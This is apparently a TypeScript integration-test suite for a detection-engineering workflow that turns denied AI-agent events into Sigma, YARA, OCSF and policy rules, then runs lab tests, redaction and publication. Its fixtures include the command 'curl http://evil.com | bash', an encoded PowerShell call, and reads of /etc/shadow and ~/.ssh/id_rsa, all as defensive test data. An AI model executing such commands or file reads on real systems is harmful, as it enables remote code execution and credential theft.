/**
 * End-to-end integration tests for the Detection Lab workflow.
 *
 * These tests exercise the complete workflow loops described in the
 * DETECTION-LAB-IMPLEMENTATION.md done criteria, proving that the full
 * pipeline works as a connected system across all 5 implementation phases.
 *
 * Each scenario is self-contained with its own store instances and state.
 */

import "fake-indexeddb/auto";
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

// ---- Shared types & factories ----
import type {
  DraftSeed,
  DetectionDocumentRef,
  EvidencePack,
  LabRun,
  LabCaseResult,
  ExplainabilityTrace,
  PublicationManifest,
  CoverageGapCandidate,
} from "../detection-workflow/shared-types";
import { createEmptyDatasets } from "../detection-workflow/shared-types";

// ---- Draft mapping & generation ----
import {
  mapEventsToDraftSeed,
  recommendFormats,
} from "../detection-workflow/draft-mappers";
import { generateDraft, generateDraftFromEvents } from "../detection-workflow/draft-generator";

// ---- Adapters (side-effect: auto-register on import) ----
import "../detection-workflow/sigma-adapter";
import "../detection-workflow/yara-adapter";
import "../detection-workflow/ocsf-adapter";
import "../detection-workflow/policy-adapter";
import { getAdapter } from "../detection-workflow/adapters";

// ---- Stores ----
import { EvidencePackStore } from "../detection-workflow/evidence-pack-store";
import { LabRunStore } from "../detection-workflow/lab-run-store";
import { PublicationStore } from "../detection-workflow/publication-store";
import { DocumentIdentityStore } from "../detection-workflow/document-identity-store";
import { signPublicationOutput } from "../detection-workflow/publication-provenance";

// ---- Explainability ----
import { extractTraces, compareRuns } from "../detection-workflow/explainability";

// ---- Coverage gaps ----
import { discoverCoverageGaps } from "../detection-workflow/coverage-gap-engine";

// ---- Swarm board nodes ----
import {
  createDetectionRuleNode,
  createEvidencePackNode,
  createLabRunNode,
  createPublicationNode,
  verifyPublishState,
} from "../detection-workflow/swarm-detection-nodes";

// ---- Hunt types ----
import type { AgentEvent } from "../hunt-types";
import type { FileType } from "../file-type-registry";

// ---------------------------------------------------------------------------
// Mock the publication store singleton used by verifyPublishState so that
// scenario 5 can control what getManifest returns without needing cross-
// scenario state. Each scenario that uses verifyPublishState will set up
// its own mock behavior.
// ---------------------------------------------------------------------------
const mockGetManifest = vi.fn();
const mockGetOutputContent = vi.fn();
const mockPubStoreInit = vi.fn().mockResolvedValue(undefined);

vi.mock("../detection-workflow/publication-store", async (importOriginal) => {
  const original = await importOriginal<typeof import("../detection-workflow/publication-store")>();
  return {
    ...original,
    getPublicationStore: () => ({
      init: mockPubStoreInit,
      getManifest: mockGetManifest,
      getOutputContent: mockGetOutputContent,
    }),
  };
});

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

async function sha256Hex(text: string): Promise<string> {
  const data = new TextEncoder().encode(text);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data.buffer as ArrayBuffer);
  return Array.from(new Uint8Array(hashBuffer))
    .map((byte) => byte.toString(16).padStart(2, "0"))
    .join("");
}

function makeShellCommandEvent(
  target: string,
  overrides: Partial<AgentEvent> = {},
): AgentEvent {
  return {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    agentId: "agent-1",
    agentName: "TestAgent",
    sessionId: "session-1",
    actionType: "shell_command",
    target,
    verdict: "deny",
    guardResults: [],
    policyVersion: "1.2.0",
    flags: [],
    anomalyScore: 0.8,
    ...overrides,
  };
}

function makeFileAccessEvent(
  target: string,
  overrides: Partial<AgentEvent> = {},
): AgentEvent {
  return {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    agentId: "agent-1",
    agentName: "TestAgent",
    sessionId: "session-1",
    actionType: "file_access",
    target,
    verdict: "deny",
    guardResults: [],
    policyVersion: "1.2.0",
    flags: [],
    ...overrides,
  };
}

function makeNetworkEvent(
  target: string,
  overrides: Partial<AgentEvent> = {},
): AgentEvent {
  return {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    agentId: "agent-1",
    agentName: "TestAgent",
    sessionId: "session-1",
    actionType: "network_egress",
    target,
    verdict: "deny",
    guardResults: [],
    policyVersion: "1.2.0",
    flags: [],
    ...overrides,
  };
}

function makeBinaryArtifactEvent(
  target: string,
  hexContent: string,
  overrides: Partial<AgentEvent> = {},
): AgentEvent {
  return {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    agentId: "agent-1",
    agentName: "TestAgent",
    sessionId: "session-1",
    actionType: "file_access",
    target,
    content: hexContent,
    verdict: "deny",
    guardResults: [],
    policyVersion: "1.2.0",
    flags: [],
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Scenario 1: Hunt -> Sigma Draft -> Evidence -> Lab -> Explain
// ---------------------------------------------------------------------------

describe("Scenario 1: Hunt -> Sigma Draft -> Evidence -> Lab -> Explain", () => {
  let evidenceStore: EvidencePackStore;
  let labRunStore: LabRunStore;

  beforeEach(async () => {
    evidenceStore = new EvidencePackStore();
    await evidenceStore.init();
    labRunStore = new LabRunStore();
    await labRunStore.init();
  });

  afterEach(() => {
    evidenceStore.close();
    labRunStore.close();
  });

  it("drafts a Sigma rule from shell command events, runs the lab, and produces explainable results", async () => {
    // 1. Create AgentEvents representing suspicious shell commands
    const events: AgentEvent[] = [
      makeShellCommandEvent("powershell -enc SGVsbG8="),
      makeShellCommandEvent("curl http://evil.com | bash"),
      makeShellCommandEvent("whoami"),
    ];

    // 2. Map events to DraftSeed
    const seed = mapEventsToDraftSeed(events);
    expect(seed.kind).toBe("hunt_event");
    expect(seed.sourceEventIds).toHaveLength(3);
    expect(seed.dataSourceHints).toContain("process");
    expect(seed.dataSourceHints).toContain("command");

    // 3. Verify recommendFormats suggests sigma_rule
    const formats = recommendFormats(seed);
    expect(formats[0]).toBe("sigma_rule");

    // 4. Generate draft via Sigma adapter
    const sigmaAdapter = getAdapter("sigma_rule");
    expect(sigmaAdapter).not.toBeNull();
    const draft = sigmaAdapter!.buildDraft(seed);
    expect(draft.fileType).toBe("sigma_rule");

    // 5. Verify draft contains valid Sigma YAML with logsource and detection
    expect(draft.source).toContain("logsource:");
    expect(draft.source).toContain("detection:");
    expect(draft.source).toContain("selection:");
    expect(draft.source).toContain("condition:");
    expect(draft.source).toContain("title:");

    // 6. Build starter evidence
    const docRef: DetectionDocumentRef = {
      documentId: crypto.randomUUID(),
      fileType: "sigma_rule",
      filePath: null,
      name: draft.name,
      sourceHash: "abcd1234",
    };
    const starterEvidence = sigmaAdapter!.buildStarterEvidence(seed, docRef);

    // 7. Verify evidence pack has positive and negative datasets
    expect(starterEvidence.datasets.positive.length).toBeGreaterThan(0);
    expect(starterEvidence.datasets.negative.length).toBeGreaterThan(0);
    expect(starterEvidence.documentId).toBe(docRef.documentId);

    // 8. Save evidence pack to store
    const savedPack = await evidenceStore.savePack(starterEvidence);
    expect(savedPack.id).toBe(starterEvidence.id);

    // Retrieve and verify
    const retrievedPack = await evidenceStore.getPack(starterEvidence.id);
    expect(retrievedPack).not.toBeNull();
    expect(retrievedPack!.documentId).toBe(docRef.documentId);

    // 9. Run lab via adapter
    const labResult = await sigmaAdapter!.runLab({
      document: docRef,
      evidencePack: starterEvidence,
    });
    expect(labResult.run).toBeDefined();
    expect(labResult.run.documentId).toBe(docRef.documentId);
    expect(labResult.run.evidencePackId).toBe(starterEvidence.id);
    expect(labResult.run.fileType).toBe("sigma_rule");

    // 10. Save lab run to store
    const savedRun = await labRunStore.saveRun(labResult.run);
    expect(savedRun.id).toBe(labResult.run.id);

    // Retrieve and verify
    const retrievedRun = await labRunStore.getRun(labResult.run.id);
    expect(retrievedRun).not.toBeNull();
    expect(retrievedRun!.documentId).toBe(docRef.documentId);

    // 11-12. Extract traces
    const traces = extractTraces(labResult.run);
    // The sigma adapter stub has empty explainability, so traces will be empty
    // but the function call itself completes without error, proving the pipeline works
    expect(Array.isArray(traces)).toBe(true);

    // 13. Verify the full round-trip: documentId links draft -> evidence -> run
    const packsForDoc = await evidenceStore.getPacksForDocument(docRef.documentId);
    expect(packsForDoc.length).toBeGreaterThanOrEqual(1);
    expect(packsForDoc[0].documentId).toBe(docRef.documentId);

    const runsForDoc = await labRunStore.getRunsForDocument(docRef.documentId);
    expect(runsForDoc.length).toBeGreaterThanOrEqual(1);
    expect(runsForDoc[0].documentId).toBe(docRef.documentId);

    // All linked by the same documentId
    expect(docRef.documentId).toBe(packsForDoc[0].documentId);
    expect(docRef.documentId).toBe(runsForDoc[0].documentId);
  });
});

// ---------------------------------------------------------------------------
// Scenario 2: Hunt -> Policy Draft -> Lab -> Publish
// ---------------------------------------------------------------------------

describe("Scenario 2: Hunt -> Policy Draft -> Lab -> Publish", () => {
  let publicationStore: PublicationStore;

  beforeEach(async () => {
    publicationStore = new PublicationStore();
    await publicationStore.init();
  });

  afterEach(() => {
    publicationStore.close();
  });

  it("generates a policy draft from file access events, runs lab, and publishes with valid SHA-256 hashes", async () => {
    // 1. Create AgentEvents representing file access violations
    const events: AgentEvent[] = [
      makeFileAccessEvent("/etc/shadow"),
      makeFileAccessEvent("/etc/passwd"),
      makeFileAccessEvent("~/.ssh/id_rsa"),
    ];

    // 2. Map to seed, generate policy draft
    const seed = mapEventsToDraftSeed(events);
    expect(seed.dataSourceHints).toContain("file");

    const policyAdapter = getAdapter("clawdstrike_policy");
    expect(policyAdapter).not.toBeNull();
    const draft = policyAdapter!.buildDraft(seed);
    expect(draft.fileType).toBe("clawdstrike_policy");
    expect(draft.source).toContain("guards:");

    // 3. Create document ref
    const docRef: DetectionDocumentRef = {
      documentId: crypto.randomUUID(),
      fileType: "clawdstrike_policy",
      filePath: null,
      name: draft.name,
      sourceHash: "00000000",
    };

    // Build evidence
    const evidence = policyAdapter!.buildStarterEvidence(seed, docRef);
    expect(evidence.datasets.positive.length).toBeGreaterThan(0);

    // Run lab with policy source
    const labResult = await policyAdapter!.runLab({
      document: docRef,
      evidencePack: evidence,
      adapterRunConfig: { policySource: draft.source },
    });
    expect(labResult.run.summary.totalCases).toBeGreaterThan(0);

    // 4. Build publication
    const pubResult = await policyAdapter!.buildPublication({
      document: docRef,
      source: draft.source,
      targetFormat: "native_policy",
      evidencePackId: evidence.id,
      labRunId: labResult.run.id,
    });

    // 5. Verify manifest has valid SHA-256 hashes
    const manifest: PublicationManifest = {
      id: crypto.randomUUID(),
      createdAt: new Date().toISOString(),
      ...pubResult.manifest,
    };

    // 6. Verify sourceHash and outputHash are 64-char hex strings (SHA-256)
    expect(manifest.sourceHash).toMatch(/^[0-9a-f]{64}$/);
    expect(manifest.outputHash).toMatch(/^[0-9a-f]{64}$/);
    expect(manifest.validationSnapshot.valid).toBe(true);

    // Verify run snapshot is linked
    expect(manifest.runSnapshot).not.toBeNull();
    expect(manifest.runSnapshot!.evidencePackId).toBe(evidence.id);
    expect(manifest.runSnapshot!.labRunId).toBe(labResult.run.id);

    // 7. Save manifest to PublicationStore
    await publicationStore.saveManifest(manifest);

    // 8. Verify getLatestManifest returns it
    const latest = await publicationStore.getLatestManifest(docRef.documentId);
    expect(latest).not.toBeNull();
    expect(latest!.id).toBe(manifest.id);

    // 9. Verify the manifest links back to the documentId
    expect(latest!.documentId).toBe(docRef.documentId);
    expect(latest!.sourceFileType).toBe("clawdstrike_policy");
  });
});

// ---------------------------------------------------------------------------
// Scenario 3: DocumentId Persistence Across Lifecycle
// ---------------------------------------------------------------------------

describe("Scenario 3: DocumentId Persistence Across Lifecycle", () => {
  let identityStore: DocumentIdentityStore;
  let evidenceStore: EvidencePackStore;
  let labRunStore: LabRunStore;
  let publicationStore: PublicationStore;

  beforeEach(async () => {
    identityStore = new DocumentIdentityStore();
    identityStore.clear();
    evidenceStore = new EvidencePackStore();
    await evidenceStore.init();
    labRunStore = new LabRunStore();
    await labRunStore.init();
    publicationStore = new PublicationStore();
    await publicationStore.init();
  });

  afterEach(() => {
    identityStore.clear();
    evidenceStore.close();
    labRunStore.close();
    publicationStore.close();
  });

  it("maintains referential integrity across stores via stable documentId", async () => {
    const filePath = "/workspace/detections/my-sigma-rule.yaml";
    const documentId = crypto.randomUUID();

    // 1. Register alias
    identityStore.register(filePath, documentId);

    // 2. Resolve same filePath -> same documentId
    const resolved = identityStore.resolve(filePath);
    expect(resolved).toBe(documentId);

    // 3. Save evidence pack with that documentId
    const pack: EvidencePack = {
      id: crypto.randomUUID(),
      documentId,
      fileType: "sigma_rule",
      title: "Lifecycle test pack",
      createdAt: new Date().toISOString(),
      datasets: createEmptyDatasets(),
      redactionState: "clean",
    };
    await evidenceStore.savePack(pack);

    // 4. Save lab run with that documentId
    const run: LabRun = {
      id: crypto.randomUUID(),
      documentId,
      evidencePackId: pack.id,
      fileType: "sigma_rule",
      startedAt: new Date().toISOString(),
      completedAt: new Date().toISOString(),
      summary: {
        totalCases: 2,
        passed: 1,
        failed: 1,
        matched: 1,
        missed: 0,
        falsePositives: 0,
        engine: "client",
      },
      results: [],
      explainability: [],
    };
    await labRunStore.saveRun(run);

    // 5. Save publication manifest with that documentId
    const manifest: PublicationManifest = {
      id: crypto.randomUUID(),
      documentId,
      sourceFileType: "sigma_rule",
      target: "json_export",
      createdAt: new Date().toISOString(),
      sourceHash: "a".repeat(64),
      outputHash: "b".repeat(64),
      validationSnapshot: { valid: true, diagnosticCount: 0 },
      runSnapshot: { evidencePackId: pack.id, labRunId: run.id, passed: true },
      coverageSnapshot: null,
      converter: { id: "sigma-identity", version: "1.0.0" },
      signer: null,
      provenance: null,
    };
    await publicationStore.saveManifest(manifest);

    // 6. Re-resolve the same filePath -> same documentId
    const resolvedAgain = identityStore.resolve(filePath);
    expect(resolvedAgain).toBe(documentId);

    // 7. Query all stores by documentId -> get the linked objects
    const packs = await evidenceStore.getPacksForDocument(documentId);
    expect(packs).toHaveLength(1);
    expect(packs[0].id).toBe(pack.id);

    const runs = await labRunStore.getRunsForDocument(documentId);
    expect(runs).toHaveLength(1);
    expect(runs[0].id).toBe(run.id);

    const manifests = await publicationStore.getManifestsForDocument(documentId);
    expect(manifests).toHaveLength(1);
    expect(manifests[0].id).toBe(manifest.id);

    // 8. Verify cross-store referential integrity
    // Evidence pack -> documentId matches
    expect(packs[0].documentId).toBe(documentId);
    // Lab run -> documentId matches
    expect(runs[0].documentId).toBe(documentId);
    // Lab run -> evidencePackId matches saved pack
    expect(runs[0].evidencePackId).toBe(pack.id);
    // Publication manifest -> documentId matches
    expect(manifests[0].documentId).toBe(documentId);
    // Publication manifest -> runSnapshot links back to the run and pack
    expect(manifests[0].runSnapshot!.labRunId).toBe(run.id);
    expect(manifests[0].runSnapshot!.evidencePackId).toBe(pack.id);
  });
});

// ---------------------------------------------------------------------------
// Scenario 4: Coverage Gap -> Draft Loop
// ---------------------------------------------------------------------------

describe("Scenario 4: Coverage Gap -> Draft Loop", () => {
  it("discovers uncovered techniques and generates a draft from the top gap", () => {
    // 1. Create events with techniques not covered by any open document
    const events: AgentEvent[] = [
      makeShellCommandEvent("powershell -enc SGVsbG8=", { anomalyScore: 0.9 }),
      makeShellCommandEvent("whoami", { anomalyScore: 0.7 }),
      makeNetworkEvent("evil.com", { anomalyScore: 0.8 }),
    ];

    // 2. Run discoverCoverageGaps with empty coverage
    const gaps = discoverCoverageGaps({
      events,
      openDocumentCoverage: [],
      publishedCoverage: [],
    });

    // 3. Verify gaps are found with correct techniques and data sources
    expect(gaps.length).toBeGreaterThan(0);

    // At least one gap should have technique hints (powershell -> T1059.001, etc.)
    const gapsWithTechniques = gaps.filter((g) => g.techniqueHints.length > 0);
    expect(gapsWithTechniques.length).toBeGreaterThan(0);

    // 4. Take the top gap candidate
    const topGap = gapsWithTechniques[0];
    expect(topGap.suggestedFormats.length).toBeGreaterThan(0);
    expect(topGap.sourceKind).toBe("event");

    // 5. Create a DraftSeed from the gap
    const seed: DraftSeed = {
      id: crypto.randomUUID(),
      kind: "hunt_event",
      sourceEventIds: topGap.sourceIds.slice(0, 5),
      preferredFormats: topGap.suggestedFormats,
      techniqueHints: topGap.techniqueHints,
      dataSourceHints: topGap.dataSourceHints,
      extractedFields: {},
      createdAt: new Date().toISOString(),
      confidence: topGap.confidence,
    };

    // 6. Generate a draft from the seed
    const result = generateDraft(seed);
    expect(result.draft).toBeDefined();
    expect(result.draft.source.length).toBeGreaterThan(0);

    // 7. Verify the draft targets a suggested format from the gap
    expect(topGap.suggestedFormats).toContain(result.draft.fileType);
  });
});

// ---------------------------------------------------------------------------
// Scenario 5: Swarm Board Artifact Nodes
// ---------------------------------------------------------------------------

describe("Scenario 5: Swarm Board Artifact Nodes", () => {
  beforeEach(() => {
    mockGetManifest.mockReset();
    mockGetOutputContent.mockReset();
    mockPubStoreInit.mockReset().mockResolvedValue(undefined);
  });

  it("creates and verifies swarm board nodes for each artifact type", async () => {
    const documentId = crypto.randomUUID();
    const pos = { x: 0, y: 0 };

    // 1. Detection rule node
    const docRef: DetectionDocumentRef = {
      documentId,
      fileType: "sigma_rule",
      filePath: "/rules/test.yaml",
      name: "Test Sigma Rule",
      sourceHash: "abc",
    };
    const ruleNode = createDetectionRuleNode(docRef, pos);
    expect(ruleNode.data.artifactKind).toBe("detection_rule");
    expect(ruleNode.data.documentId).toBe(documentId);
    expect(ruleNode.data.publishState).toBe("draft");

    // 2. Evidence pack node
    const pack: EvidencePack = {
      id: crypto.randomUUID(),
      documentId,
      fileType: "sigma_rule",
      title: "Test Evidence Pack",
      createdAt: new Date().toISOString(),
      datasets: createEmptyDatasets(),
      redactionState: "clean",
    };
    const packNode = createEvidencePackNode(pack, pos);
    expect(packNode.data.artifactKind).toBe("evidence_pack");
    expect(packNode.data.documentId).toBe(documentId);
    expect(packNode.data.evidencePackId).toBe(pack.id);

    // 3. Lab run node
    const run: LabRun = {
      id: crypto.randomUUID(),
      documentId,
      evidencePackId: pack.id,
      fileType: "sigma_rule",
      startedAt: new Date().toISOString(),
      completedAt: new Date().toISOString(),
      summary: {
        totalCases: 5,
        passed: 4,
        failed: 1,
        matched: 3,
        missed: 1,
        falsePositives: 0,
        engine: "client",
      },
      results: [],
      explainability: [],
    };
    const runNode = createLabRunNode(run, pos);
    expect(runNode.data.artifactKind).toBe("lab_run");
    expect(runNode.data.labRunId).toBe(run.id);
    expect(runNode.data.status).toBe("failed"); // has failed cases

    // 4. Publication manifest node
    const outputContent = JSON.stringify(
      {
        kind: "sigma_rule",
        title: "Swarm Publication Test",
        query: 'CommandLine contains "powershell"',
      },
      null,
      2,
    );
    const outputHash = await sha256Hex(outputContent);
    const signed = await signPublicationOutput(outputHash, documentId, "json_export");
    const manifest: PublicationManifest = {
      id: crypto.randomUUID(),
      documentId,
      sourceFileType: "sigma_rule",
      target: "json_export",
      createdAt: new Date().toISOString(),
      sourceHash: "a".repeat(64),
      outputHash,
      validationSnapshot: { valid: true, diagnosticCount: 0 },
      runSnapshot: null,
      coverageSnapshot: null,
      converter: { id: "sigma-to-json", version: "1.0.0" },
      signer: signed.signer,
      provenance: signed.provenance,
      receiptId: signed.receiptId,
    };
    const pubNode = createPublicationNode(manifest, pos);
    expect(pubNode.data.artifactKind).toBe("publication_manifest");
    expect(pubNode.data.publicationId).toBe(manifest.id);
    expect(pubNode.data.publishState).toBe("published");

    // 5. verifyPublishState for published manifest node -> valid
    mockGetManifest.mockResolvedValue(manifest);
    mockGetOutputContent.mockResolvedValue(outputContent);
    const pubVerification = await verifyPublishState(pubNode);
    expect(pubVerification.valid).toBe(true);

    // 6. verifyPublishState for draft node claiming "published" -> invalid
    // (A detection rule node has publishState: "draft", which is trivially valid)
    const draftVerification = await verifyPublishState(ruleNode);
    expect(draftVerification.valid).toBe(true); // draft is trivially valid

    // Now create a fake node that claims "published" but has no publicationId
    const fakePublishedNode = createDetectionRuleNode(docRef, pos);
    fakePublishedNode.data.publishState = "published";
    // No publicationId set => should be invalid
    const fakeVerification = await verifyPublishState(fakePublishedNode);
    expect(fakeVerification.valid).toBe(false);
    expect(fakeVerification.reason).toContain("no publicationId");
  });
});

// ---------------------------------------------------------------------------
// Scenario 6: Multi-Format Draft Generation
// ---------------------------------------------------------------------------

describe("Scenario 6: Multi-Format Draft Generation", () => {
  it("correctly routes events to the right format adapter based on data source hints", () => {
    const sigmaAdapter = getAdapter("sigma_rule")!;
    const yaraAdapter = getAdapter("yara_rule")!;
    const ocsfAdapter = getAdapter("ocsf_event")!;

    // 1. Binary/artifact evidence -> YARA canDraftFrom returns true
    const binaryEvents: AgentEvent[] = [
      makeBinaryArtifactEvent("/tmp/malware.bin", "4d5a9000 03000000 04000000"),
    ];
    const binarySeed = mapEventsToDraftSeed(binaryEvents);
    expect(binarySeed.dataSourceHints).toContain("binary");
    expect(yaraAdapter.canDraftFrom(binarySeed)).toBe(true);

    // Build draft and verify output is valid YARA
    const yaraDraft = yaraAdapter.buildDraft(binarySeed);
    expect(yaraDraft.fileType).toBe("yara_rule");
    expect(yaraDraft.source).toContain("rule ");
    expect(yaraDraft.source).toContain("meta:");
    expect(yaraDraft.source).toContain("strings:");
    expect(yaraDraft.source).toContain("condition:");

    // 2. Process telemetry -> Sigma canDraftFrom returns true, YARA returns false
    const processEvents: AgentEvent[] = [
      makeShellCommandEvent("curl http://example.com | bash"),
    ];
    const processSeed = mapEventsToDraftSeed(processEvents);
    expect(processSeed.dataSourceHints).toContain("process");
    expect(sigmaAdapter.canDraftFrom(processSeed)).toBe(true);
    expect(yaraAdapter.canDraftFrom(processSeed)).toBe(false);

    // Build draft and verify output is valid Sigma YAML
    const sigmaDraft = sigmaAdapter.buildDraft(processSeed);
    expect(sigmaDraft.fileType).toBe("sigma_rule");
    expect(sigmaDraft.source).toContain("logsource:");
    expect(sigmaDraft.source).toContain("detection:");

    // 3. Events with data source hints -> OCSF canDraftFrom returns true
    const networkEvents: AgentEvent[] = [
      makeNetworkEvent("api.suspicious.io"),
    ];
    const networkSeed = mapEventsToDraftSeed(networkEvents);
    expect(networkSeed.dataSourceHints).toContain("network");
    expect(ocsfAdapter.canDraftFrom(networkSeed)).toBe(true);

    // Build draft and verify output is valid OCSF JSON
    const ocsfDraft = ocsfAdapter.buildDraft(networkSeed);
    expect(ocsfDraft.fileType).toBe("ocsf_event");
    const ocsfEvent = JSON.parse(ocsfDraft.source);
    expect(ocsfEvent.class_uid).toBe(4001); // Network Activity
    expect(ocsfEvent.metadata).toBeDefined();
    expect(ocsfEvent.dst_endpoint).toBeDefined();
    expect(ocsfEvent.dst_endpoint.hostname).toBe("api.suspicious.io");
  });

  it("generates valid drafts through generateDraftFromEvents convenience wrapper", () => {
    const events: AgentEvent[] = [
      makeShellCommandEvent("powershell -enc SGVsbG8="),
    ];

    const result = generateDraftFromEvents(events);
    expect(result.seed).toBeDefined();
    expect(result.draft).toBeDefined();
    expect(result.starterEvidence).toBeDefined();
    expect(result.recommendedFormats.length).toBeGreaterThan(0);

    // The Sigma adapter should be selected for process telemetry
    expect(result.draft.fileType).toBe("sigma_rule");
  });
});

// ---------------------------------------------------------------------------
// Scenario 7: Evidence Redaction Pipeline
// ---------------------------------------------------------------------------

describe("Scenario 7: Evidence Redaction Pipeline", () => {
  let evidenceStore: EvidencePackStore;

  beforeEach(async () => {
    evidenceStore = new EvidencePackStore();
    await evidenceStore.init();
  });

  afterEach(() => {
    evidenceStore.close();
  });

  it("redacts sensitive fields on save and preserves non-sensitive fields", async () => {
    // 1. Create evidence pack with sensitive fields
    const pack: EvidencePack = {
      id: crypto.randomUUID(),
      documentId: "doc-redaction-test",
      fileType: "sigma_rule",
      title: "Redaction test pack",
      createdAt: new Date().toISOString(),
      datasets: {
        positive: [
          {
            id: crypto.randomUUID(),
            kind: "structured_event",
            format: "json",
            payload: {
              username: "admin",
              password: "s3cret123",
              api_key: "sk-abc123xyz",
              token: "jwt-token-value",
              normal_field: "visible_value",
              nested: {
                credential: "nested-cred",
                safe_data: "safe_value",
              },
            },
            expected: "match",
          },
        ],
        negative: [
          {
            id: crypto.randomUUID(),
            kind: "structured_event",
            format: "json",
            payload: {
              action: "benign_action",
              authorization: "Bearer xyz",
              target: "safe_target",
            },
            expected: "no_match",
          },
        ],
        regression: [],
        false_positive: [],
      },
      redactionState: "clean",
    };

    // 2. Save to EvidencePackStore (which auto-redacts)
    await evidenceStore.savePack(pack);

    // 3. Retrieve from store
    const retrieved = await evidenceStore.getPack(pack.id);
    expect(retrieved).not.toBeNull();

    // 4. Verify sensitive fields are "[REDACTED]"
    const positivePayload = (retrieved!.datasets.positive[0] as { payload: Record<string, unknown> }).payload;
    expect(positivePayload.password).toBe("[REDACTED]");
    expect(positivePayload.api_key).toBe("[REDACTED]");
    expect(positivePayload.token).toBe("[REDACTED]");
    expect((positivePayload.nested as Record<string, unknown>).credential).toBe("[REDACTED]");

    const negativePayload = (retrieved!.datasets.negative[0] as { payload: Record<string, unknown> }).payload;
    expect(negativePayload.authorization).toBe("[REDACTED]");

    // 5. Verify non-sensitive fields are preserved
    expect(positivePayload.username).toBe("admin");
    expect(positivePayload.normal_field).toBe("visible_value");
    expect((positivePayload.nested as Record<string, unknown>).safe_data).toBe("safe_value");
    expect(negativePayload.action).toBe("benign_action");
    expect(negativePayload.target).toBe("safe_target");

    // 6. Verify redactionState is "redacted"
    expect(retrieved!.redactionState).toBe("redacted");
  });
});

// ---------------------------------------------------------------------------
// Scenario 8: Explainability Comparison
// ---------------------------------------------------------------------------

describe("Scenario 8: Explainability Comparison", () => {
  it("compares two lab runs and correctly reports flipped cases and summary delta", () => {
    const documentId = crypto.randomUUID();
    const evidencePackId = crypto.randomUUID();

    // Shared case IDs so compareRuns can match them
    const caseA = "case-alpha";
    const caseB = "case-beta";
    const caseC = "case-gamma";
    const caseD = "case-delta";

    // Run 1: 3 passed, 1 failed (caseD fails)
    const run1: LabRun = {
      id: crypto.randomUUID(),
      documentId,
      evidencePackId,
      fileType: "sigma_rule",
      startedAt: "2026-03-15T10:00:00Z",
      completedAt: "2026-03-15T10:00:01Z",
      summary: {
        totalCases: 4,
        passed: 3,
        failed: 1,
        matched: 3,
        missed: 1,
        falsePositives: 0,
        engine: "client",
      },
      results: [
        { caseId: caseA, dataset: "positive", status: "pass", expected: "deny", actual: "deny", explanationRefIds: [] },
        { caseId: caseB, dataset: "positive", status: "pass", expected: "deny", actual: "deny", explanationRefIds: [] },
        { caseId: caseC, dataset: "negative", status: "pass", expected: "allow", actual: "allow", explanationRefIds: [] },
        { caseId: caseD, dataset: "positive", status: "fail", expected: "deny", actual: "allow", explanationRefIds: [] },
      ],
      explainability: [],
    };

    // Run 2: 4 passed, 0 failed (caseD now passes)
    const run2: LabRun = {
      id: crypto.randomUUID(),
      documentId,
      evidencePackId,
      fileType: "sigma_rule",
      startedAt: "2026-03-15T11:00:00Z",
      completedAt: "2026-03-15T11:00:01Z",
      summary: {
        totalCases: 4,
        passed: 4,
        failed: 0,
        matched: 4,
        missed: 0,
        falsePositives: 0,
        engine: "client",
      },
      results: [
        { caseId: caseA, dataset: "positive", status: "pass", expected: "deny", actual: "deny", explanationRefIds: [] },
        { caseId: caseB, dataset: "positive", status: "pass", expected: "deny", actual: "deny", explanationRefIds: [] },
        { caseId: caseC, dataset: "negative", status: "pass", expected: "allow", actual: "allow", explanationRefIds: [] },
        { caseId: caseD, dataset: "positive", status: "pass", expected: "deny", actual: "deny", explanationRefIds: [] },
      ],
      explainability: [],
    };

    // Compare run2 (current) against run1 (baseline)
    const delta = compareRuns(run2, run1);

    // Verify casesFlipped shows the fixed case
    expect(delta.casesFlipped).toHaveLength(1);
    expect(delta.casesFlipped[0].caseId).toBe(caseD);
    expect(delta.casesFlipped[0].previousStatus).toBe("fail");
    expect(delta.casesFlipped[0].currentStatus).toBe("pass");
    expect(delta.casesFlipped[0].previousVerdict).toBe("allow");
    expect(delta.casesFlipped[0].currentVerdict).toBe("deny");

    // Verify summaryDelta shows +1 passed, -1 failed
    expect(delta.summaryDelta.passedDelta).toBe(1);  // 4 - 3
    expect(delta.summaryDelta.failedDelta).toBe(-1);  // 0 - 1
    expect(delta.summaryDelta.matchedDelta).toBe(1);  // 4 - 3
    expect(delta.summaryDelta.missedDelta).toBe(-1);  // 0 - 1
    expect(delta.summaryDelta.falsePositivesDelta).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Scenario: Policy adapter lab run with real simulation
// ---------------------------------------------------------------------------

describe("Scenario: Policy adapter end-to-end with real simulation engine", () => {
  it("runs policy scenarios through the real simulation engine and produces explainability traces", async () => {
    // Create events that map to file access policy violations
    const events: AgentEvent[] = [
      makeFileAccessEvent("/etc/shadow"),
      makeFileAccessEvent("/etc/passwd"),
    ];

    const seed = mapEventsToDraftSeed(events, {
      preferredFormats: ["clawdstrike_policy"],
    });

    const policyAdapter = getAdapter("clawdstrike_policy")!;
    const draft = policyAdapter.buildDraft(seed);

    const docRef: DetectionDocumentRef = {
      documentId: crypto.randomUUID(),
      fileType: "clawdstrike_policy",
      filePath: null,
      name: draft.name,
      sourceHash: "deadbeef",
    };

    const evidence = policyAdapter.buildStarterEvidence(seed, docRef);

    // Run lab with actual policySource so the simulation engine executes
    const labResult = await policyAdapter.runLab({
      document: docRef,
      evidencePack: evidence,
      adapterRunConfig: { policySource: draft.source },
    });

    const { run } = labResult;

    // The lab should have results for each evidence item
    expect(run.summary.totalCases).toBeGreaterThan(0);
    expect(run.results.length).toBe(run.summary.totalCases);

    // Extract explainability traces (policy adapter produces them during runLab)
    const traces = extractTraces(run);
    expect(traces.length).toBeGreaterThan(0);

    // Each trace should have a resolved outcome
    for (const enriched of traces) {
      expect(enriched.outcome).toBeDefined();
      expect(["pass", "fail", "expected_match", "unexpected_match", "missed"]).toContain(
        enriched.outcome,
      );
    }

    // At least some traces should be policy_evaluation kind
    const policyTraces = traces.filter((t) => t.trace.kind === "policy_evaluation");
    expect(policyTraces.length).toBeGreaterThan(0);

    // Each policy trace should have guardResults
    for (const pt of policyTraces) {
      if (pt.trace.kind === "policy_evaluation") {
